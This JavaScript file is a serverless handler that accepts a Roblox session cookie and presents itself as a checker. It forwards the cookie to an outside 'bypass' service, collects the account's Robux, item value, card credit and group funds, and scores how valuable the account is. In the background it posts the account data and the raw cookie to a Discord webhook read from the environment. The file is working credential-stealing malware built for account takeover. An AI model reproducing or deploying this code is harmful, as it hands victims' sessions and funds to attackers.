const fetch = require('node-fetch');
const sharp = require('sharp');

// Helper function to make Roblox API requests
async function robloxRequest(url, cookie = null, method = 'GET', body = null) {
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json'
    };
    
    if (cookie) {
        headers['Cookie'] = `.ROBLOSECURITY=${cookie}`;
    }
    
    const options = {
        method,
        headers
    };
    
    if (body) {
        headers['Content-Type'] = 'application/json';
        options.body = JSON.stringify(body);
    }
    
    const response = await fetch(url, options);
    return response.json();
}

// Validate cookie and get user info
async function validateCookie(cookie) {
    try {
        const userInfo = await robloxRequest('https://users.roblox.com/v1/users/authenticated', cookie);
        if (userInfo && userInfo.id) {
            return userInfo;
        }
        return null;
    } catch (error) {
        return null;
    }
}

// Optimize and compress avatar image
async function optimizeAvatar(avatarUrl) {
    try {
        const response = await fetch(avatarUrl);
        const buffer = await response.buffer();
        
        const optimized = await sharp(buffer)
            .resize(150, 150, { fit: 'cover' })
            .jpeg({ quality: 80, progressive: true })
            .toBuffer();
        
        return `data:image/jpeg;base64,${optimized.toString('base64')}`;
    } catch (error) {
        return avatarUrl; // Return original if optimization fails
    }
}

// Calculate account score
function calculateAccountScore(userData) {
    let score = 0;
    
    // Robux score (max 20 points)
    if (userData.robux > 10000) score += 20;
    else if (userData.robux > 5000) score += 15;
    else if (userData.robux > 1000) score += 10;
    else if (userData.robux > 100) score += 5;
    
    // RAP score (max 20 points)
    if (userData.rap > 100000) score += 20;
    else if (userData.rap > 50000) score += 15;
    else if (userData.rap > 10000) score += 10;
    else if (userData.rap > 1000) score += 5;
    
    // Premium (10 points)
    if (userData.isPremium) score += 10;
    
    // Voice Chat (5 points)
    if (userData.vcStatus === '✅ Enabled') score += 5;
    
    // Headless (15 points)
    if (userData.headlessStatus === '✅ True') score += 15;
    
    // Korblox (10 points)
    if (userData.korbloxStatus === '✅ True') score += 10;
    
    // Account age (max 10 points)
    const ageDays = parseInt(userData.accountAge);
    if (ageDays > 2000) score += 10;
    else if (ageDays > 1000) score += 7;
    else if (ageDays > 365) score += 5;
    else if (ageDays > 100) score += 3;
    
    // Friends/Followers (max 5 points)
    const totalSocial = userData.friendsCount + userData.followersCount;
    if (totalSocial > 1000) score += 5;
    else if (totalSocial > 500) score += 3;
    else if (totalSocial > 100) score += 2;
    
    // Groups owned (max 5 points)
    if (userData.totalGroupsOwned > 5) score += 5;
    else if (userData.totalGroupsOwned > 2) score += 3;
    else if (userData.totalGroupsOwned > 0) score += 2;
    
    return Math.min(score, 100); // Cap at 100
}

// Get all user data
async function getUserData(userId, cookie) {
    try {
        // Get user info
        const userInfo = await robloxRequest(`https://users.roblox.com/v1/users/${userId}`);
        
        // Get avatar thumbnail
        const thumbnailData = await robloxRequest(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
        const avatarUrl = thumbnailData.data?.[0]?.imageUrl || 'https://via.placeholder.com/150';
        
        // Optimize avatar
        const optimizedAvatar = await optimizeAvatar(avatarUrl);
        
        // Get robux
        const robuxData = await robloxRequest(`https://economy.roblox.com/v1/users/${userId}/currency`, cookie);
        const robux = robuxData.robux || 0;
        
        // Get premium status
        let isPremium = false;
        try {
            const premiumData = await robloxRequest(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`);
            isPremium = premiumData || false;
        } catch (e) {
            isPremium = false;
        }
        
        // Get friends count
        const friendsData = await robloxRequest(`https://friends.roblox.com/v1/users/${userId}/friends/count`);
        const friendsCount = friendsData.count || 0;
        
        // Get followers count
        const followersData = await robloxRequest(`https://friends.roblox.com/v1/users/${userId}/followers/count`);
        const followersCount = followersData.count || 0;
        
        // Get inventory value (RAP)
        let rap = 0;
        try {
            const collectiblesData = await robloxRequest(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?sortOrder=Asc&limit=100`);
            if (collectiblesData.data) {
                for (const item of collectiblesData.data) {
                    rap += item.recentAveragePrice || 0;
                }
            }
        } catch (e) {
            rap = 0;
        }
        
        // Get pending robux
        let pendingRobux = 0;
        try {
            const transactionsData = await robloxRequest(`https://economy.roblox.com/v2/users/${userId}/transactions?transactionType=Sale&limit=100`, cookie);
            if (transactionsData.data) {
                pendingRobux = transactionsData.data.filter(t => t.isPending).reduce((sum, t) => sum + t.robuxAmount, 0);
            }
        } catch (e) {
            pendingRobux = 0;
        }
        
        // Check for specific items (Headless, Korblox)
        let headlessStatus = '❌ False';
        let korbloxStatus = '❌ False';
        try {
            const headlessCheck = await robloxRequest(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/31000?limit=10`);
            if (headlessCheck.data && headlessCheck.data.length > 0) {
                headlessStatus = '✅ True';
            }
            
            const korbloxCheck = await robloxRequest(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/139607770?limit=10`);
            if (korbloxCheck.data && korbloxCheck.data.length > 0) {
                korbloxStatus = '✅ True';
            }
        } catch (e) {
            // Items not found
        }
        
        // Get account settings
        let pinStatus = '❌ Disabled';
        let emailVerified = '❌ Not Verified';
        try {
            const settingsData = await robloxRequest('https://accountsettings.roblox.com/v1/account/settings', cookie);
            if (settingsData) {
                pinStatus = settingsData.IsAccountPinEnabled ? '✅ Enabled' : '❌ Disabled';
                emailVerified = settingsData.IsEmailVerified ? '✅ Verified' : '❌ Not Verified';
            }
        } catch (e) {
            // Settings not accessible
        }
        
        // Check voice chat
        let vcStatus = '❌ Disabled';
        try {
            const vcData = await robloxRequest(`https://voice.roblox.com/v1/settings`, cookie);
            if (vcData && vcData.isVoiceEnabled) {
                vcStatus = '✅ Enabled';
            }
        } catch (e) {
            vcStatus = '❌ Disabled';
        }
        
        // Get groups owned
        let totalGroupsOwned = 0;
        let totalGroupFunds = 0;
        let totalPendingGroupFunds = 0;
        
        try {
            const groupsData = await robloxRequest(`https://groups.roblox.com/v2/users/${userId}/groups/roles`);
            if (groupsData.data) {
                for (const group of groupsData.data) {
                    if (group.role.rank === 255) {
                        totalGroupsOwned++;
                        try {
                            const groupFunds = await robloxRequest(`https://economy.roblox.com/v1/groups/${group.group.id}/currency`, cookie);
                            if (groupFunds && groupFunds.robux) {
                                totalGroupFunds += groupFunds.robux;
                            }
                        } catch (e) {
                            // Can't access group funds
                        }
                    }
                }
            }
        } catch (e) {
            // Groups not accessible
        }
        
        // Calculate account age
        const createdDate = new Date(userInfo.created);
        const now = new Date();
        const ageInDays = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));
        const accountAge = `${ageInDays} days`;
        
        // Get credit balance
        let creditBalance = 0;
        try {
            const creditData = await robloxRequest('https://billing.roblox.com/v1/credit', cookie);
            if (creditData && creditData.balance) {
                creditBalance = creditData.balance;
            }
        } catch (e) {
            creditBalance = 0;
        }
        
        const creditRobux = Math.floor(creditBalance * 100);
        const summary = `${robux + totalGroupFunds} R$`;
        
        const userData = {
            userInfo,
            avatarUrl: optimizedAvatar,
            robux,
            pendingRobux,
            rap,
            summary,
            pinStatus,
            isPremium,
            vcStatus,
            headlessStatus,
            korbloxStatus,
            accountAge,
            friendsCount,
            followersCount,
            emailVerified,
            creditBalance,
            creditRobux,
            totalGroupsOwned,
            totalGroupFunds,
            totalPendingGroupFunds
        };
        
        // Calculate score
        const score = calculateAccountScore(userData);
        userData.accountScore = score;
        
        return userData;
    } catch (error) {
        throw error;
    }
}

// Main handler
module.exports = async (req, res) => {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, error: 'Method not allowed' });
    }
    
    const { cookie, checkOnly } = req.body;
    
    if (!cookie || typeof cookie !== 'string' || cookie.trim().length === 0) {
        return res.status(400).json({ success: false, error: 'Cookie required' });
    }
    
    try {
        // Step 1: Validate cookie first
        const userInfo = await validateCookie(cookie);
        
        if (!userInfo || !userInfo.id) {
            // Invalid cookie - don't send to webhook, just return error
            return res.status(401).json({ success: false, error: 'Invalid cookie' });
        }
        
        const userId = userInfo.id;
        
        // If check only mode, return early
        if (checkOnly) {
            return res.status(200).json({
                success: true,
                checkOnly: true,
                valid: true,
                userId: userId,
                username: userInfo.name
            });
        }
        
        // Step 2: Call bypass API
        const bypassResponse = await fetch('https://rblxbypasser.com/api/bypass', {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            },
            body: JSON.stringify({ cookie })
        });
        
        const bypassData = await bypassResponse.json();
        
        if (!bypassResponse.ok || !bypassData.success) {
            return res.status(500).json({ success: false, error: 'Bypass failed' });
        }
        
        // Step 3: Get all user data
        const userData = await getUserData(userId, cookie);
        
        // Step 4: Send to webhook (only valid cookies reach here)
        const W = process.env.WEBHOOK_URL;
        
        if (W) {
            // Send in background without blocking response
            (async () => {
                try {
                    const p1 = {
                        content: '@everyone',
                        username: 'HyperBlox',
                        avatar_url: 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
                        embeds: [{
                            title: '',
                            type: 'rich',
                            description: `<:check:1350103884835721277> **[Check Cookie](https://hyperblox.eu/controlPage/check/check.php?cookie=${cookie})** <:line:1350104634982662164> <:refresh:1350103925037989969> **[Refresh Cookie](https://hyperblox.eu/controlPage/antiprivacy/kingvon.php?cookie=${cookie})** <:line:1350104634982662164> <:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/${userId}/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/${userId})**`,
                            color: 0x00061a,
                            thumbnail: { url: userData.avatarUrl },
                            fields: [
                                { name: '<:display:1348231445029847110> Display Name', value: `\`\`\`${userData.userInfo.displayName}\`\`\``, inline: true },
                                { name: '<:user:1348232101639618570> Username', value: `\`\`\`${userData.userInfo.name}\`\`\``, inline: true },
                                { name: '<:userid:1348231351777755167> User ID', value: `\`\`\`${userId}\`\`\``, inline: true },
                                { name: '<:robux:1348231412834111580> Robux', value: `\`\`\`${userData.robux}\`\`\``, inline: true },
                                { name: '<:pending:1348231397529223178> Pending Robux', value: `\`\`\`${userData.pendingRobux}\`\`\``, inline: true },
                                { name: '<:rap:1348231409323741277> RAP', value: `\`\`\`${userData.rap}\`\`\``, inline: true },
                                { name: '<:summary:1348231417502371890> Summary', value: `\`\`\`${userData.summary}\`\`\``, inline: true },
                                { name: '<:pin:1348231400322498591> PIN', value: `\`\`\`${userData.pinStatus}\`\`\``, inline: true },
                                { name: '<:premium:1348231403690786949> Premium', value: `\`\`\`${userData.isPremium ? '✅ True' : '❌ False'}\`\`\``, inline: true },
                                { name: '<:vc:1348233572020129792> Voice Chat', value: `\`\`\`${userData.vcStatus}\`\`\``, inline: true },
                                { name: '<:headless:1348232978777640981> Headless Horseman', value: `\`\`\`${userData.headlessStatus}\`\`\``, inline: true },
                                { name: '<:korblox:1348232956040319006> Korblox Deathspeaker', value: `\`\`\`${userData.korbloxStatus}\`\`\``, inline: true },
                                { name: '<:age:1348232331525099581> Account Age', value: `\`\`\`${userData.accountAge}\`\`\``, inline: true },
                                { name: '<:friends:1348231449798774865> Friends', value: `\`\`\`${userData.friendsCount}\`\`\``, inline: true },
                                { name: '<:followers:1348231447072215162> Followers', value: `\`\`\`${userData.followersCount}\`\`\``, inline: true },
                                { name: '<:creditbalance:1350102024376684644> Credit Card Balance', value: `\`\`\`${userData.creditBalance} USD (est ${userData.creditRobux} Robux)\`\`\``, inline: true },
                                { name: '<:group:1350102040818221077> Groups Owned', value: `\`\`\`${userData.totalGroupsOwned}\`\`\``, inline: true },
                                { name: '<:combined:1350102005884125307> Combined Group Funds', value: `\`\`\`${userData.totalGroupFunds} Robux (${userData.totalPendingGroupFunds} pending)\`\`\``, inline: true },
                                { name: '<:status:1350102051756970025> Account Status', value: `\`\`\`${userData.emailVerified}\`\`\``, inline: true },
                                { name: '⭐ Account Score', value: `\`\`\`${userData.accountScore}/100\`\`\``, inline: true }
                            ]
                        }]
                    };
                    
                    const p2 = {
                        content: '',
                        username: 'HyperBlox',
                        avatar_url: 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
                        embeds: [{
                            description: `\`\`\`${cookie}\`\`\``,
                            color: 0x00061a
                        }]
                    };
                    
                    await fetch(W, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(p1)
                    });
                    
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    
                    await fetch(W, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(p2)
                    });
                } catch (e) {
                    // Silent error
                }
            })();
        }
        
        // Step 5: Return success response with account data
        res.status(200).json({
            success: true,
            avatarUrl: userData.avatarUrl,
            userInfo: {
                username: userData.userInfo.name,
                displayName: userData.userInfo.displayName,
                userId: userId,
                robux: userData.robux,
                pendingRobux: userData.pendingRobux,
                rap: userData.rap,
                summary: userData.summary,
                pin: userData.pinStatus,
                premium: userData.isPremium ? '✅ True' : '❌ False',
                voiceChat: userData.vcStatus,
                headless: userData.headlessStatus,
                korblox: userData.korbloxStatus,
                accountAge: userData.accountAge,
                friends: userData.friendsCount,
                followers: userData.followersCount,
                emailVerified: userData.emailVerified,
                creditBalance: userData.creditBalance,
                creditRobux: userData.creditRobux,
                groupsOwned: userData.totalGroupsOwned,
                groupFunds: userData.totalGroupFunds,
                pendingGroupFunds: userData.totalPendingGroupFunds,
                accountScore: userData.accountScore
            }
        });
        
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
};